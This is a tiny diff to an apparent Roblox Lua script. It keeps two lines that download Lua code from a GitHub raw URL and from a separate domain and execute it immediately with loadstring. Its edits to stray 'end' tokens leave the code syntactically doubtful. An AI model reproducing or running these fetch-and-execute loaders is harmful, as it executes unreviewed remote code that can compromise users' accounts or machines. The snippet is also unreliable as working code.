@@ -1,3 +1,6 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
-end)
+end
+
 loadstring(game:HttpGet("https://egorikusa.space/90ffaabb1619d14d10f657b0.lua", true))()
+
+end
